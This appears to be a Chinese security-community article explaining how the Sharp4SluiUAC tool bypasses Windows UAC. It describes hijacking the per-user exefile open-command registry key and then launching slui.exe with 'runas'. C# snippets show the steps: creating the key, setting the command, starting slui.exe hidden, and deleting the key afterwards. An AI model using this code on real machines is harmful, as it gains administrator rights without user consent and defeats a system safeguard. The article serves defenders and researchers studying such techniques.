# Sharp4SluiUAC：一款通过 slui.exe 白名单进程绕过 UAC 实现提升权限-先知社区

> **来源**: https://xz.aliyun.com/news/17472  
> **文章ID**: 17472

---

Windows UAC 用于防止未经授权的程序获取管理员权限。一般情况下，标准用户运行需要管理员权限的程序时，系统会弹出 UAC 提示，要求用户手动确认。绕过 UAC 的方式有很多，其中利用 HKCU\Software\Classes 目录下的注册表劫持是一种常见的方法。

## 0x01 slui.exe 基本介绍

slui.exe 全称 Software Licensing User Interface，是 Windows 软件许可界面，用于 激活 Windows 操作系统。该程序位于 C:\Windows\System32\slui.exe，是 Windows 正版验证 和 产品密钥管理 的重要组件。

一般情况下可以使用 命令行参数 运行 slui.exe 来执行不同的 Windows 激活任务，比如 直接打开 电话激活 界面，显示 微软技术支持电话 供用户拨打进行人工激活，命令如下所示。

​

```
slui.exe 4
```

这将打开 Windows 电话激活界面，提供对应的电话支持信息，如下图所示。

​

![](images/20250402155518-d1a56e71-0f97-1.png!post)

## 0x02 注册表关联可执行文件

注册表项 Software\Classes\exefile\Shell\Open\command 主要用于 定义 Windows 运行 .exe 可执行文件时的默认命令，默认情况下该项的值为：

​

```
"%1" %*
```

此处的 "%1" 代表 用户双击的 .exe 文件的完整路径。 %\* 代表 传递给该 .exe 文件的所有命令行参数。这样，Windows 能够正确执行文件，并支持传递命令行参数。

如果攻击者能够修改 Software\Classes\exefile\Shell\Open\command，那么所有 .exe 程序的执行方式都会被改变。攻击者可以替换默认执行命令，劫持 .exe 文件的执行，比如：

​

```
cmd.exe /c calc.exe
```

这样，当用户运行任何 .exe 文件时，Windows 都会执行 cmd.exe /c calc.exe，而不是原来的可执行文件。

​

## 0x03 编码实现

在某些 Windows 版本中，slui.exe 运行时 可能在高权限环境下执行注册表中的 exefile\Shell\Open\command，从而导致 代码执行，具体的代码如下所示。

​

```
RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\Classes\", true);
registryKey.CreateSubKey("exefile\Shell\Open\command");
```

上述代码中， Registry.CurrentUser 表示操作的是 当前用户 下的注册表，而不是计算机上的全局注册表。当前用户注册表路径是：HKEY\_CURRENT\_USER。再通过 OpenSubKey 打开已经存在的注册表项，并设置参数为 true，表示我们需要对注册表项进行读写操作。

​

接着，通过 SetValue 方法向注册表添加或者修改值，这里 encodedComman参数是一个经过某种编码或修改的命令，可能用来执行特定的系统命令操作。

​

```
RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\Classes\exefile\Shell\Open\command", true);
registryKey2.SetValue("", encodedCommand);
registryKey2.Close();
```

最后，调用 Process 启动 slui.exe，并且指定 Verb= runas 表示以管理员权限运行。具体代码 如下所示。

​

```
new Process
{
    StartInfo = 
    {
        WindowStyle = ProcessWindowStyle.Hidden,
        FileName = "C:\windows\system32\slui.exe",
        Verb = "runas"
    }
}.Start();
Thread.Sleep(10000);
registryKey.DeleteSubKeyTree("exefile");
```

​

在 slui.exe 启动后，等待 10 秒钟，再删除先前创建的注册表项，恢复系统的状态，图上是执行了 cmd.exe，启动一个管理员权限的命令行窗口。

​

![](images/20250402155519-d27c556a-0f97-1.png!post)

​

综上， 通过修改注册表项 exefile\Shell\Open\command 来执行指定命令，并利用slui.exe 触发 UAC 提升，从而绕过系统权限控制执行恶意操作。
